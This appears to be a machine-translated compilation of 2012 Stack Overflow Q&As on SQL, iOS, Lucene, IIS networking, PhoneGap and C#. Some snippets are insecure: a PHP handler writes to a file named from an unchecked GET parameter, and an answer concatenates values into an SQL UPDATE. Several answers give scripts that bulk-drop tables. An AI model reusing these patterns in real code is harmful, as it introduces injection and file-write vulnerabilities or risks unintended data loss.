请参阅：此处的“JSON 有效负载示例”：[Apple 推送通知服务](http://developer.apple.com/library/mac/#documentation/NetworkingInternet/Conceptual/RemoteNotificationsPG/ApplePushService/ApplePushService.html#//apple_ref/doc/uid/TP40008194-CH100-SW9)

# sql - 检查一个表的列中的所有值是否存在于另一个表中

> ID：13125534
> 
> 赞同：3
> 
> 时间：2012-10-29T16:17:50.257
> 
> 标签：sql, oracle, database

我想知道检查一个表中的所有值（使用 select 语句创建）是否存在于另一个表（使用 select 命令创建）中的命令都在一个 select 语句中。例如，我有一个属性`fid`，并且`faculty_name`在**教员表中**和`fid`, `class_name`, `room_n`o 在另一个。***我如何检查在所有房间里教的所有教员？***

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-29T16:35:51.387

问题问得不好，但是

```
--
-- all faculty without a class
--
select *
from faculty f
where not exists ( select *
                   from class c
                   where c.fid = f.fid
                 )
--
-- all classes wihout faculty
--
select *
from class c
where not exists ( select *
                   from faculty f
                   where f.fid = c.fid
                 )
--
-- all-in-one. Each returned row represents
-- either a faculty or class without a match
-- in the other
--
select *
from      faculty f
full join class   c on c.fid = f.fid
where c.fid is null
   or f.fid is null 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:23:49.737

你可以试试这样的

```
select a.faculty_name, b.class_name, b.room_no 
  from faculty a, Table2 b 
 where a.fid = b.fid 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-10-29T23:18:34.333

假设您有两个表：faculty 和 class。Fid (faculty id) 应该是faculty 表的主键和class 表的外键。

这里只能是您要寻找的两种情况：所有学院都有课程或只有一些学院。

要查找谁有课：

```
SELECT
  fid,
  faculty_name
FROM
  faculty f
  INNER JOIN
  class c
  ON
      f.fid = c.fid 
```

要查找没有上课的人：

```
SELECT
  fid,
  faculty_name
FROM
   faculty f
   LEFT OUTER JOIN
   class c
   ON
      f.fid = c.fid
WHERE
  c.fid is null 
```

# objective-c - 如何修改“HelloWorld”代码以将两个数字相乘而不是更改文本

> ID：13125540
> 
> 赞同：0
> 
> 时间：2012-10-29T16:17:58.087
> 
> 标签：objective-c, ios

是什么导致下面第 3 行出现“预期标识符”错误？

```
-(IBAction)changeGreeting:(id)sender {

  self.userName = self.textField.text;
  float amount = [[self.textField.text] floatValue];  **! Expected identifier**
  // float amount = [[self.userName] floatValue];

  NSString *nameString = self.userName;
  if ([nameString length] == 0) {
      nameString = @"World";
  }

  NSString *greeting = [[NSString alloc] initWithFormat:@"Hello, %@!", nameString];
  self.label.text = greeting;
} 
```

我可以将文本转换为浮点数、将值加倍并在同一个按钮操作方法中显示吗？

我是 OOP 编程的新手。非常感谢任何提示。沃尔特

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:25:47.370

你的问题是：

```
[self.textField.text] 
```

您不需要放置，`[ ]`因为您没有调用方法，您应该这样调用它：

```
[self.textField.text floatValue] 
```

`[ ]`当你想调用一个方法时，你只需要使用。

# iphone - 延迟部分 iPhone 方法

> ID：13125549
> 
> 赞同：1
> 
> 时间：2012-10-29T16:18:29.150
> 
> 标签：iphone, selector

我有一个需要几个参数的方法，我需要延迟该方法的一部分。我不想将它分成几个方法并使用`[self performSelectorAfterDelay]`，因为延迟需要该方法中已经存在的参数。我需要类似以下的东西

```
-(void)someMethod{
.....

delay {

     more code but not a separate self method
}
... finish method
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T16:45:51.053

该`dispatch_after`功能似乎符合您的需求：

```
double delayInSeconds = 2.0;
dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, delayInSeconds * NSEC_PER_SEC);
dispatch_after(popTime, dispatch_get_main_queue(), ^(void) {
    // this code is going to be executed, on the main queue (or thread) after 2.0 seconds.
}); 
```

当然，时间是可配置的，刚开始读起来有点混乱，但是一旦你习惯了块如何与objective-c代码一起工作，你应该可以开始了。

一个警告：

***从来*没有，从来没有，从来没有！使用 .阻止 iPhone 应用程序的主线程`sleep()`。只是不要这样做！**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:37:27.330

看起来有点矫枉过正。

```
-(void)someMethod{

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        NSLog(@"Start code");
        dispatch_queue_t backgroundQueue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0);
        dispatch_sync(backgroundQueue, ^{

            sleep(5);
            // delayed code
            NSLog(@"Delayed code");
        });

        dispatch_sync(backgroundQueue, ^{

            // finishing code
            NSLog(@"Finishing code");
        });
    });

} 
```

`backgroundQueue`可能是外部调度呼叫的用户。不过看起来真的很糟糕：）

# sql - 删除以特定字符开头的表

> ID：13125550
> 
> 赞同：0
> 
> 时间：2012-10-29T16:18:29.467
> 
> 标签：sql, sql-server, sql-server-2008

我有多个表名，例如 g_str_a 、 g_str_ab 、 g_str_abc 。我想删除 SQL Server 2008 上所有以 g_str 开头的表。

会`DROP Tables like 'g_str'`帮助吗？

请帮我写剧本。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:29:34.267

```
SELECT 
'DROP TABLE ' + QUOTENAME(SCHEMA_NAME(schema_id)) + '.' + QUOTENAME(name) + ';'
FROM sys.tables
WHERE name LIKE 'g\_str%'  ESCAPE '\' 
```

然后查看脚本并运行它。

如果您需要完全自动化的解决方案，您还可以[将结果连接](https://stackoverflow.com/a/451441/73226)成单个字符串并执行。`EXEC`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-29T16:30:17.477

您可以使用动态 SQL：

```
DECLARE @SQL NVARCHAR(MAX) = '';

SELECT  @SQL = @SQL + 'DROP TABLE ' + QUOTENAME(SCHEMA_NAME([Schema_ID])) + '.' + QUOTENAME([name]) + ';'
FROM    sys.tables
WHERE   Name LIKE 'g\_str%' ESCAPE('\');

EXECUTE SP_EXECUTESQL @SQL; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-29T16:33:02.780

以下查询将自动删除表：

```
 BEGIN TRANSACTION

    DECLARE @tmpTablesToDelete TABLE ( 
                                        RowNumber INT PRIMARY KEY
                                       ,Query NVARCHAR(MAX)
                                     )

    INSERT INTO
            @tmpTablesToDelete 
    SELECT 
         RowNumber = ROW_NUMBER() OVER (ORDER BY (SELECT (0)))
        ,'DROP TABLE '+schemas.name+'.'+objects.name AS Query
    FROM 
        sys.objects 
    INNER JOIN
        sys.schemas
    ON
        schemas.schema_id = objects.schema_id
    WHERE 
        type = 'U' AND objects.name like 'g_str%'

    DECLARE @Counter INT
    SELECT @Counter = MAX(RowNumber) FROM @tmpTablesToDelete

    WHILE(@Counter > 0) BEGIN

        DECLARE @Query NVARCHAR(MAX)

        SELECT @Query = Query FROM @tmpTablesToDelete WHERE RowNumber = @Counter

        PRINT @Query

        EXEC sp_executesql @statement = @Query

        SET @Counter = @Counter - 1

    END

    COMMIT TRANSACTION 
```

# java - Lucene 4.0 覆盖最终方法 tokenStream

> ID：13125551
> 
> 赞同：5
> 
> 时间：2012-10-29T16:18:29.773
> 
> 标签：java, lucene

由于不同的原因，我必须使用最新版本的 Lucene API。

API 还没有很好的记录，所以我发现自己无法执行简单的`addDocument()`

这是`Writer`初始化：

```
analyzer = new StopAnalyzer(Version.LUCENE_40);
config = new IndexWriterConfig(Version.LUCENE_40, analyzer);
writer = new IndexWriter(FSDirectory.open(new File(ConfigUtil.getProperty("lucene.directory"))), config); 
```

简单的`toDocument`方法：

```
public static Document getDocument(User user) {
    Document doc = new Document();
    FieldType storedType = new FieldType();
    storedType.setStored(true);
    storedType.setTokenized(false);

    // Store user data
    doc.add(new Field(USER_ID, user.getId().toString(), storedType));
    doc.add(new Field(USER_NAME, user.getFirstName() + user.getLastName(), storedType));

    FieldType unstoredType = new FieldType();
    unstoredType.setStored(false);
    unstoredType.setTokenized(true);

    // Analyze Location
    String tokens = "";
    if (user.getLocation() != null && ! user.getLocation().isEmpty()){
        for (Tag location : user.getLocation()) tokens += location.getName() + " ";
        doc.add(new Field(USER_LOCATION, tokens, unstoredType));
    }
} 
```

运行时：

```
Document userDoc = DocumentManager.getDocument(userWrap);
IndexAccess.getWriter().addDocument(userDoc); 
```

这是我收到的错误消息：

`class org.apache.lucene.analysis.util.ReusableAnalyzerBase overrides final method tokenStream.(Ljava/lang/String;Ljava/io/Reader;)Lorg/apache/lucene/analysis/TokenStream;`

这可能是一件简单的事情，但我找不到任何参考来帮助解决这个问题。我正在使用默认值`analyzer`，并且按照教程进行操作以避免被弃用`Field.Index.ANALYZED`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:39:39.637

这是由于某种 JAR 版本不匹配造成的。您可能依赖于一个 contrib JAR，而后者又依赖于不同版本的 Lucene。尝试在运行时获取确切的依赖集并查找任何版本不匹配。

# ruby-on-rails-3 - 如何从 Flash AS3 文件中读取 jpg 字节数组

> ID：13125566
> 
> 赞同：2
> 
> 时间：2012-10-29T16:18:55.530
> 
> 标签：ruby-on-rails-3, actionscript-3

我正在尝试将 Flash AS3 中的图像作为 jpg 文件保存到我的服务器。我找到了一些 PHP 代码来执行此操作，但我想在 Ruby 中执行此操作。我不太确定如何将以下代码转换为 Ruby。这主要是`$GLOBALS["HTTP_RAW_POST_DATA"]`我不知道如何转换的部分。

```
<?php

   if ( isset ( $GLOBALS["HTTP_RAW_POST_DATA"] )) {

      // get bytearray $im = $GLOBALS["HTTP_RAW_POST_DATA"];

      // save image $f = fopen($_GET['name'], 'wb'); fwrite($f, $jpg); fclose($f);

   } else echo 'An error occured.';

?> 
```

资源：

[http://designreviver.com/tutorials/actionscript-3-jpeg-encoder-revealed-saving-images-from-flash/](http://designreviver.com/tutorials/actionscript-3-jpeg-encoder-revealed-saving-images-from-flash/)

我尝试执行以下操作，但生成的图像文件未打开

```
temp_file = Tempfile.new(['temp', '.jpg'], :encoding => 'ascii-8bit')
temp_file.write(request.raw_post)
temp_file.close 
```

**编辑**

图像数据在`request.raw_post`

**编辑2**

至于正在发送的图像，这是在 AS3 中创建标头的方式

```
var header:URLRequestHeader = new URLRequestHeader("Content-type", "application/octet-stream");
var saveJPG:URLRequest = new URLRequest("http://127.0.0.1:3000/save_image.xml");
saveJPG.requestHeaders.push(header); 
```

saveJPG.method = URLRequestMethod.POST；

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:27:28.900

```
$GLOBALS["HTTP_RAW_POST_DATA"] 
```

可以从

```
request.env["HTTP_RAW_POST_DATA"] 
```

并将其保存为[https://stackoverflow.com/a/2571575/643500](https://stackoverflow.com/a/2571575/643500)

**编辑：**

图像数据不是在`request.body`吗？

我需要看看图像是如何发送的。你有一个标题`Content-Type`吗？

# networking - Windows 2008 R2 Server 偶尔在 80 端口上提供网页服务，其他端口都很好

> ID：13125571
> 
> 赞同：1
> 
> 时间：2012-10-29T16:19:18.920
> 
> 标签：networking, iis-7.5, windows-server-2008-r2, port80

这几天一直在追这个问题。它来来去去......意思是，问题存在 8-10 小时，然后消失 12 小时，然后重新出现 4 小时，然后消失 2 小时，依此类推。

这是我的设置：我有一个运行 IIS 7.5 的 Windows 2008 R2 服务器，它托管了大约 60 个网站。每个网站都有自己绑定的 IP 地址。所有站点都在端口 80 上运行，除了一个（我的管理面板）在端口 443 (ssl) 上运行。

我注意到这些网站上周停止工作。我访问了其中一个站点，chrome 给了我“糟糕！Google Chrome 无法连接到 www.mysite.com 尝试重新加载...”。如果我刷新页面 5 或 6 次（有时需要 10 次以上），那么该网站就会出现。我最初的想法是这是一个与网络相关的问题，所以我 RDP 连接到服务器，打开 IIS 并从 IIS 中的浏览链接浏览到一些站点。我直接在服务器上看到了同样的东西。然后我想，也许是因为通过点击IP，它仍然首先到达路由器，这可能是问题的根源，所以我将其中一个站点绑定到环回地址（127.0.0.1）并看到了同样的问题。

通过这些“测试”，我发现只有端口 80 有问题。我的下一个想法是，也许是赛门铁克的端点保护（我的病毒软件）阻止了端口 80 上的传入请求，所以我禁用了它......同样的问题。

然后我想这可能是我的 Windows 防火墙规则呕吐。我重新创建了规则以允许端口 80 上的流量通过，同样的问题。然后我完全禁用了防火墙，看看是否有其他东西在防火墙内绊倒了它，同样的问题。

然后，我尝试从远程计算机远程登录到端口 80 上的站点之一。它通过了 3 或 4 次，然后 telnet 将无法连接。因此，它所经历的时间是服务器提供网页的时间。它无法连接的时间是它不会为页面提供服务的时间。

然后，我在 IIS 中为其中一个站点添加了“失败的请求跟踪”，看看我是否可以确定它失败时失败的原因。我试图访问该站点几次，但失败了，但没有创建日志。然后我终于通过了，它创建了一个日志。这告诉我，当它失败时，它甚至没有进入 IIS。

然后我尝试运行：

```
netstat -anp tcp | find ":80" 
```

看看是否有其他东西正在捕获从端口 80 传入的流量。这并没有向我显示任何异常情况。我还下载并运行了 TcpView 并没有看到任何会捕获端口 80 上的流量的东西。然后我停止了 IIS 并再次运行上述两个，当 IIS 停止时，端口 80 上没有任何监听。

然后，我尝试进行一些端口映射，将来自端口 80 的流量映射到高端口，看看这是否至少允许服务器始终如一地服务页面。我用这个命令来映射端口

```
netsh interface portproxy add v4tov4 listenport=80 listenaddress=188.55.22.11 connectport=20005 connectaddress=188.55.22.11 
```

这也没有解决问题，它告诉我问题甚至在它达到网络堆栈的那个级别之前就已经发生了（我不知道在哪里？？）。

我已经完成了 iisreset，我已经重新启动了服务器，我已经运行了病毒扫描，我已经运行了 Windows 更新，我已经完成了磁盘碎片整理......没有任何东西可以解决这个问题。

我的问题可能与硬件有关吗？网络接口是否会变坏到只允许一个端口上的流量，但允许所有其他流量通过的程度？我可以 FTP 到机器没有任何问题，我可以 RDP 到机器没有任何问题，如上所述，我在 443 上的站点从未出现过问题......它只有端口 80。

我完全不知道要寻找/解决这个问题的方法。在这一点上的任何建议都将受到欢迎。

**更新：** 我将网络接口切换到服务器上的另一个 NIC 并看到同样的问题

TIA

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T16:18:17.190

您确定不是您的应用程序池崩溃了吗？127.0.0.1:20005 工作可能是因为当您将其映射到 20005 时，流量停止从端口 80 进入，因此您的网站没有任何流量导致它崩溃。

检查您的事件日志以查看您的任何应用程序池是否因崩溃而重新启动。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T16:48:05.757

昨晚我实际上卸载了 Symantec Endpoint Protection，现在看来一切都恢复正常了。我认为是网络威胁检测杀死了它。我会放几天，如果事情仍然清楚，我会在这里报告并给出答案。

**编辑：** 它已经持续了几天，没有任何问题，所以我将把问题归咎于 SEP 捕获流量并杀死它。看起来真的很奇怪，它只会在某些时候反弹流量，然后它会长时间工作而不会出现任何故障。我已经重新安装了 SEP 减去网络威胁检测，一切都很好。

# facebook - 如何在 iOS5 上使用 FacebookSDK 3.1

> ID：13125575
> 
> 赞同：2
> 
> 时间：2012-10-29T16:19:31.370
> 
> 标签：facebook, ios5, ios6

我在 iOS6 和 iOS5 上使用 facebookSDK 3.1 时遇到问题。我使用 developer.facebook.com 的教程和资源在 iOS6 上正常运行。

现在对于 iOS5，我正在使用 [FBSession openActiveSessionWithReadPermissions:allowLoginUI:completionHandler:]，我看到 iOS 模拟器中弹出了一个 Web 身份验证。

但是在回调中，我总是返回 FBSessionStateClosedLoginFailed。不知道我需要做什么才能使它正常工作。

提前致谢

# c# - 未从列表中删除的项目

> ID：13125576
> 
> 赞同：0
> 
> 时间：2012-10-29T16:19:35.560
> 
> 标签：c#, .net

我有以下代码。在我的测试计划列表集合中有 150 项。删除后计数为 75，这意味着从列表中删除了 75 个项目。为什么在那之后 countItems 列表是 150。似乎没有从列表中删除项目。为什么？如何从列表中删除项目。

```
...
planList = (IList<UserPlanned>)_jsSerializer.Deserialize(plannedValues,typeof(IList<UserPlanned>));
int count = planList.ToList().RemoveAll(eup => eup.ID <= -1);
int countItems = planList.Count;
... 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-29T16:21:59.273

当您调用 ToList() 时，它会复制您的列表，然后从副本中删除项目。利用：

```
int count = planList.RemoveAll(eup => eup.ID <= -1); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-29T16:22:02.523

实际上，您是从由 ToList 方法创建的列表中删除元素，而不是从 planList 本身。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-29T16:24:06.780

`ToList()`正在创建要从中删除项目的不同列表。这基本上就是你正在做的事情：

```
var list1 = (List<UserPlanned>)_jsSerializer.Deserialize(plannedValues,typeof(List<UserPlanned>));
var list2 = list1.ToList(); // ToList() creates a *new* list.

list2.RemoveAll(eup => eup.Id <= -1);

int count = list2.Count;
int count2 = list1.Count; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-29T16:24:23.927

```
var templst = planList.ToList();
int count = templst.RemoveAll(eup => eup.ID <= -1);
int countItems = templst.Count; 
```

那应该工作。如上所述，tolist 命令创建一个新列表，从中删除值。我不知道你的 planList 的类型，但如果它已经是一个 List，你可以简单地省略 .tolist

```
int count = planList.RemoveAll(eup => eup.ID <= -1); 
```

请原谅摇摇欲坠的c#，我正在正常编写vb.net

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-29T16:33:45.867

代码应该类似于

```
lanList = (List<UserPlanned>)_jsSerializer.Deserialize(plannedValues,typeof(List<UserPlanned>));

int count = planList.RemoveAll(eup => eup.ID <= -1);

int countItems = planList.Count; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-29T16:23:20.127

```
planList = (List<UserPlanned>)_jsSerializer.Deserialize(plannedValues,typeof(List<UserPlanned>));
int count = planList.RemoveAll(eup => eup.ID <= -1);
int countItems = planList.Count; 
```

删除`ToList()`. 这是在内存中创建一个新列表，因此您永远不会真正更新您的基础列表。你也不需要它。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-10-29T16:23:22.123

planList 没有改变。

```
planList.ToList()  //This creates a new list.
.RemoveAll()       //This is called on the new list.  It is not called on planList. 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-10-29T16:26:05.823

planList.ToList() 创建 RemoveAll 操作的新列表。它不会修改 IEnumerable planList。

尝试这样的事情：

```
planList = (List<UserPlanned>)_jsSerializer
     .Deserialize(plannedValues,typeof(List<UserPlanned>))
    .ToList();
int count = planList.RemoveAll(eup => eup.ID <= -1);
int countItems = planList.Count; 
```

如果您使用的是 JavaScriptSerializer， http: [//msdn.microsoft.com/en-us/library/bb355316.aspx_](http://msdn.microsoft.com/en-us/library/bb355316.aspx_) 然后试试这个：

```
planList = _jsSerializer.Deserialize<List<UserPlanned>>(plannedValues);

int count = planList.RemoveAll(eup => eup.ID <= -1);
int countItems = planList.Count; 
```

# php - PHP图像替换？

> ID：13125580
> 
> 赞同：0
> 
> 时间：2012-10-29T16:19:50.787
> 
> 标签：php, file-upload

我有一个脑死的时刻......如果有人可以和我谈谈这个并提出建议，那就太好了。

我正在从数据库中导入 URL，例如`www.mysite.com/images/image1.jpg`设置为变量`newimage1`

这是从数据库加载并放置在页面上的。

由于这是一个编辑页面，用户可以上传新图像。

如果用户没有上传新图片，而是保存了页面，则该变量`newimage1`未设置，它会从数据库中清除现有的图片 url，因为该变量设置为`""`.

最好的方法是什么？一个 if 语句，它检查是否`newimage1`为空并将其从更新到数据库中删除？

对不起这个简单的问题！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:23:01.763

```
if( empty($_REQUEST['newImage1']) ) {
  //program logic
} else {
  //program logic
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:33:54.373

```
$image_name = "";
if(!empty($_FILES)){
    $image_name = $_FILES['image']['tmp_name'];
}

$sql = "UPDATE table SET var1 = 'value1', var2='value2'";
if($image_name != "")
    $sql .= ", image_name = '".$image_name."'";
$sql .= " WHERE id_entry = 5"; 
```

# eclipse - Eclipse 3.6，关闭 Salesforce 的自动完成功能（force.com）

> ID：13125581
> 
> 赞同：1
> 
> 时间：2012-10-29T16:19:58.290
> 
> 标签：eclipse, salesforce, force.com

我在 Eclipse 中使用 force.com (Salesforce) 插件。
有没有办法强制关闭自动完成？（输入引号会使结尾对自动出现。这让我抓狂）

在 Eclipse 中，我可以为个别语言关闭此功能，但首选项 > force.com 部分并未公开此功能。如果自动完成功能在所有地方都被强制关闭，我会很高兴。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:26:46.657

您正在寻找的是“编辑器”首选项（搜索`editor`然后`Typing`在您的语言的编辑器下方查找）。

对于 Java，应该是 Java -> Editor -> Typing -> Automatically close。

# windows-phone-7 - WP7 - PhoneGap FileTransfer 返回 Null 错误代码

> ID：13125584
> 
> 赞同：0
> 
> 时间：2012-10-29T16:20:10.503
> 
> 标签：windows-phone-7, cordova, file-transfer

我第一次在 WP7 中尝试 PhoneGap/Cordova 2.1.0，所以我是新手。

我应该做的是通过相机拍摄照片并将其上传到服务器。

这是我的代码：

```
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no;" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8"/>
    <title>PhoneGap WP7</title>
    <script type="text/javascript" charset="utf-8" src="cordova-2.1.0.js"></script>

    <script type="text/javascript">

        document.addEventListener("deviceready", onDeviceReady, false);

        function onDeviceReady() { }

        function capturePhoto() 
        {
            // Take picture using device camera and retrieve image
            navigator.camera.getPicture(
                onPhotoDataSuccess, 
                onFail, 
                { 
                    quality: 50, 
                    destinationType: Camera.DestinationType.DATA_URL 
                }
            );
        }

        function onPhotoDataSuccess(imageData) 
        {
            var options = new FileUploadOptions();
            options.fileKey = "file";
            options.fileName = imageData.substr(imageData.lastIndexOf('/') + 1);
            options.mimeType="image/jpeg";

            var params = new Object();

            options.params = params;

            var ft = new FileTransfer();
            ft.upload(imageData, "http://mysite.com/upload.php", win, fail, options);
        }

        function onFail(message) 
        {
            navigator.notification.alert('Failed because: ' + message);
        }

        var win = function(r) 
        {
            navigator.notification.alert(r.responseCode + " - " + r.response + " - " + r.bytesSent);
        }

        var fail = function(error) 
        {
            navigator.notification.alert(eval(error));
        }

    </script>
</head>
<body>
    <h1>PhoneGap Photo Demo</h1>
    <button onclick="capturePhoto();">Capture a Photo</button>
</body>
</html> 
```

当我尝试这个时，上传不起作用，我得到一个空的错误对象：

```
{ "code":null, "source":null, "target":null, "http_status":null } 
```

一些注意事项：

我按照[这个技巧](https://stackoverflow.com/questions/9291809/workaround-for-missing-whitelist-in-phonegap-for-windows-phone)在 WP7 中丢失了白名单。

php代码不是我写的，我会在asp.net中编写，如果有人可以提供一个带有asp.net webservice的工作示例，将不胜感激。

谢谢。

编辑

我调试了 FileTransfer 类，但在 JsonHelper 类中出现错误：

```
using (MemoryStream mem = new MemoryStream(Encoding.UTF8.GetBytes(json)))
{
   result = deserializer.ReadObject(mem);
} 
```

错误是：InvalidCastException

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T17:55:54.410

编辑

尝试更换

```
uploadOptions = JSON.JsonHelper.Deserialize<UploadOptions[]>(options)[0]; 
```

与以下

```
options = JSON.JsonHelper.Deserialize<string[]>(options)[0];
uploadOptions = JSON.JsonHelper.Deserialize<UploadOptions>(options); 
```

原始答案

解决此类问题的最简单方法是添加对 Cordova 库源代码的引用，而不是编译的 WP7CordovaClassLib.dll

cordova-2.1.0-incubating-src\cordova-2.1.0\incubator-cordova-wp7\framework\WP7CordovaClassLib.csproj

[http://www.apache.org/dist/incubator/cordova/](http://www.apache.org/dist/incubator/cordova/)

然后将断点添加到standalone\cordovalib\Commands\FileTransfer.cs

```
 /// <summary>
    /// sends a file to a server
    /// </summary>
    /// <param name="options">Upload options</param>
    public void upload(string options)
    {
        Debug.WriteLine("options = " + options);
        options = options.Replace("{}", "null"); 
```

听起来很复杂，但根据我的经验，逐行调试是了解 Apache Cordova 在许多情况下出现什么问题的最简单方法。

# python - 需要建议如何将日志记录功能与 Python 中的数据处理分离

> ID：13125585
> 
> 赞同：4
> 
> 时间：2012-10-29T16:20:13.663
> 
> 标签：python, logging, aop

在我的项目中，我有一组通过调用外部命令来完成某些工作并返回结果的类。我们称它们为“报告”。

我想将日志记录添加到这些报告中，但是，将在运行时而不是在定义类时定义具体的记录器对象。

所以，现在我看到了两个如何实现日志记录的变体：

I. 在运行时，实例化一些`ReportLogger`类实例，它可以使用给定的具体记录器对所有给定的报告实例进行猴子修补，并具有日志记录功能。

优点：

*   可以将日志记录应用到我真正需要的任何子报表类，而不涉及其他类。

缺点：

*   魔法！猴子修补不是明确的做事方式。
*   日志记录实际上是在运行时应用的，因此在查看报告类代码时很难理解是否存在一些日志记录。

二、单例`ReportLogger`类，在创建时通过装饰器包装所有报告，但在运行时接受具体记录器。

优点：

*   明确和干净的方式来标记这些报告需要记录（以及实际应用它）。

缺点：

*   处理从基本类继承的子类更难`Report`。例如，如果在基`Report`类中，某些方法（如`collect_data()`用 装饰`@log_collect_data`），那么对于子类，日志记录将与`collect_data()`. 或者，也许，我必须将实际代码从 to 拆分`collect_data()`，例如，`_collect_data()`在子类中修改它，调用`_collect_data()`from `collect_data()`，然后`collect_data()`用`@log_collect_data`.

我喜欢第二种方法，但我想要更好的方法来处理子类，而不是使用 _collect_data()。欢迎任何建议！

# http - 在 tshark 或 tcpdump 中仅过滤初始 GET 请求。包括 HTTP 和 HTTPS

> ID：13125586
> 
> 赞同：2
> 
> 时间：2012-10-29T16:20:16.220
> 
> 标签：http, https, wireshark, packet-sniffers, tcpdump

我希望能够使用 tshark 或 tcpdump 仅过滤初始 GET 请求。这必须适用于 HTTP 和 HTTPS 流量。这是我目前拥有的...

```
tshark -R '(http.request.method == "GET") && (http.request.uri =="/")' 
```

这将返回所有 HTTP 流量的 GET 请求，但当我访问 HTTPS 站点时什么也不做。任何想法都会很棒！谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T18:32:17.903

“https”是 HTTP-over-SSL/TLS-over-TCP。“SSL/TLS”部分意味着原始 TCP 段包含*加密*数据，因此它们不包含字符串“GET”（除非纯属意外，加密到包含0x47 0x45 0x54）。

这意味着任何进行过滤的程序都必须*解密*流中的数据。tcpdump 不支持解密 SSL/TLS；[在某些情况下，Wireshark/TShark 可以配置为解密 SSL/TLS 流量，前提是您可以为其提供所需的信息](http://wiki.wireshark.org/SSL)。

# c# - 从基类继承所有 IEnumerator

> ID：13125587
> 
> 赞同：2
> 
> 时间：2012-10-29T16:20:16.543
> 
> 标签：c#, oop

我真的是 C# 新手，所以请对我温柔 ;)

我正在尝试编写一个继承自 DataGridView 类的类。在大多数情况下，它很简单......但我在尝试使用任何 linq 查询访问基本集合（DataGridViewRowCollection 等......）时遇到问题......据我所知......我' d 需要实现 IEnumerable 和 IEnumerator 接口......但在我继承的类中，我确实没有额外的功能。所以......我想要的只是确保我继承的类提供与 DataGridView 相同的查询功能。

我已经阅读了很多关于此的内容......但似乎我找不到一个直接的答案，它会说“无论如何......只是从基类中实现了那些东西”，以编程方式......当然...... .

显然，我希望派生类的用户（即我）在基类不需要它们的情况下不必为一堆显式转换而烦恼。

最后......无论我最终在派生类中做什么......我需要将我的类声明为：

MyDataGridViewClass：DataGridView、IEnumerable、IEnumerate

或者，一旦我修复了我必须在我的代码中修复的内容，IEnumerable、IEnumerate 部分是否会隐含？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T19:32:22.120

您在任何接口的基类中执行的任何实现都将在继承者（子类）上可用。

```
interface IFoo
{
   void Foo();
}

class Foo : IFoo
{
   public void Foo() { }
}

class FooBar : Foo
{
} 
```

这都是有效的：

```
FooBar fooBar = new FooBar();
Foo foo = fooBar;
IFoo ifoo = foo;

ifoo.Foo(); 
```

如果`Foo`方法被显式声明：

```
class Foo : IFoo
{
   void IFoo.Foo() { }
} 
```

必须进行演员表。

# c# - 跨嵌套的 ParallelFor 循环同步

> ID：13125590
> 
> 赞同：0
> 
> 时间：2012-10-29T16:20:39.113
> 
> 标签：c#, .net-4.0, parallel-processing

我有一个带有运行嵌套`ParallelFor`循环的方法的类。基本上我正在迭代一个对象列表，然后是一个包含在每个对象属性中的列表。

根据为内部循环中的每个对象计算的条件，我想添加到队列中。我正在使用“syncRoot”对象来尝试在添加到队列时保持并发性。

```
public class ParallelTest
{
    private static object syncRoot = new object();

    public void Test() {
       List<MyLog> queue = new List<MyLog>();
       ...
       Parallel.For(0, set.Count(), delegate(int i)
       {
           var obj = set[i];
           List<Connection> conns = obj.GetConnections();
           ...      
           Parallel.For(0, conns.Count(), delegate(int j)
           {    
               Connection c = conns[j];
               MyLog log = new MyLog();             
               ...                  
               if (condition)
               {                    
                   lock (syncRoot)
                   {
                       queue.Add(log);
                   }
               }
           }
       }

       Debug.WriteLine(queue.Count);
   }
} 
```

我遇到的问题是，似乎并非我的所有对象都被添加到队列中。我正在测试一组 200 个对象并将 替换为`condition`，`true`所以我希望`queue.Count`是 200。但是，我得到了奇怪的结果......有时是 200，有时是 198 或 199。

我在这里做错了什么？如何确保每个线程都被考虑在内？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:37:45.037

这似乎是 Linq 的绝佳候选者。

假设由 表示的代码`...`可以封装在带有签名的方法中：

```
void Initialize(MyLog log, Connection conn, SomeUnknownType obj) 
```

您的代码可以简化为以下 linq 语句：

```
 var logs = set  
        .AsParallel()
        .SelectMany(
            obj =>
                obj.GetConnections()
                    .Select(conn => new{obj, conn}))
        .Select(x => { 
            var o = new{x.obj, x.conn, log = new MyLog()};
            Initialize(o.log, o.conn, o.obj); //or just do work inline
            return o;
        })
